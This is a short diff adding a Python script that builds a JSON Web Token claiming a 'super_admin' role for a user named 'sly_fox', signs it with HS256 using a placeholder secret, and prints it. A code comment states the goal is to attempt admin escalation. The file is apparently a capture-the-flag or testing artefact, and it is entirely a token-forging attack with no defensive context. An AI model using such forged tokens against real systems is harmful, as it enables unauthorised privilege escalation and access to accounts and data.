@@ -1,0 +1,14 @@
+import jwt
+
+# Your payload change to attempt admin escalation
+secret = "replace_with_secret_if_known"
+payload = {
+    "id": 2,
+    "username": "sly_fox",
+    "role": "super_admin",
+    "exp": 1733983483  # Valid expiration
+}
+
+# Encode with HS256 or test the server's validation requirements
+token = jwt.encode(payload, secret, algorithm="HS256")
+print("Generated Token:", token)
